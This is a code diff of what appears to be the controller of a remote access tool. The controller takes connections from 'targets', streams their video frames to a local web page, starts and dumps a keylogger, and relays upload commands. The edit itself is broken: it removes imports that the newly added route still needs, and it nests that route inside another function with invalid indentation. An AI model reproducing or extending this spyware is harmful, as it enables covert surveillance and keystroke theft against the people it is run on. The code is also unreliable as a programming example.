@@ -1,13 +1,12 @@
 import socket
 import threading
 import time
-from flask import Flask, Response, render_template_string, request, redirect, url_for
+from flask import Flask, Response, render_template_string, request
 from colorama import Fore, init
 import cv2
 import numpy as np
 import keyboard  # Import the keyboard library
 from datetime import datetime
-from werkzeug.serving import make_server
 
 init(autoreset=True)
 
@@ -48,6 +47,8 @@ html_template = """
 </html>
 """
 
+
+
 def start_streaming(client_socket, mode, client_id):
     global streaming
     streaming = True
@@ -67,18 +68,12 @@ def start_streaming(client_socket, mode, client_id):
     def video_feed():
         return Response(generate_frames(client_socket, client_id),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
-
-    # Start the Flask app in a separate thread to handle streaming
-    run_flask_app()
-
+      
     print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
 
-def run_flask_app():
-    global server_thread
-    app_server = make_server('0.0.0.0', 5000, app)
-    server_thread = threading.Thread(target=app_server.serve_forever)
-    server_thread.start()
+    # Run the Flask app in a separate thread to handle the streaming
+    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=5000, use_reloader=False)).start()
 
 def generate_frames(client_socket, client_id):
     global streaming
@@ -103,6 +98,14 @@ def start_keylogger():
         keylogger_running = True
         print(Fore.YELLOW + "[ * ] Keylogger started.")
 
+    @app.route('/stop_streaming')
+    def stop_streaming():
+    global streaming
+    streaming = False  # Stop streaming
+    print(Fore.RED + "[ * ] Stopping streaming...")
+    return redirect(url_for('index'))
+
+
 def stop_keylogger():
     global keylogger_running
     if keylogger_running:
@@ -126,13 +129,6 @@ def dump_keylogger_data():
         else:
             filtered_data.append(key)
     return ''.join(filtered_data)
-
-@app.route('/stop_streaming')
-def stop_streaming():
-    global streaming
-    streaming = False  # Stop streaming
-    print(Fore.RED + "[ * ] Stopping streaming...")
-    return redirect(url_for('index'))
 
 def handle_client(client_socket, addr):
     target_ip, target_port = addr
@@ -168,6 +164,7 @@ def handle_client(client_socket, addr):
 
         elif command == "upload":
             print(Fore.YELLOW + "[ * ]  Starting...")
+            # In this case, we're not asking for file input, just sending the command to the client
             response = client_socket.recv(4096).decode('utf-8', errors='ignore')
             print(Fore.WHITE + response)
 
